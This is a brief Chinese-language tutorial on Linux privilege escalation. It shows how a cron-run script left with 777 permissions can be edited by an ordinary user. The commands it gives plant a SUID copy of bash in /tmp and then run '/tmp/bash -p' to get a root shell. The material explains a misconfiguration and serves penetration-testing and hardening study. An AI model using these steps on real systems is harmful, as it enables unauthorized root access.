管理员在设置一个定时任务的时候，通常都需要给定时任务的脚本添加一个执行权限，正常情况下都是"chmod +x test.sh"，而有些管理员偷懒直接添加一个777权限，这时普通用户就可以修改test.sh文件中的内容，就会导致权限配置不当提权。
```
cat /etc/crontab

vim test.sh 进行追加内容
cp /bin/bash /tmp/bash; chmod +s /tmp/bash  ##将bin下的bash复制到tmp下，同时加上SUID权限。

定时任务执行后
/tmp/bash -p 即可获取root会话。
```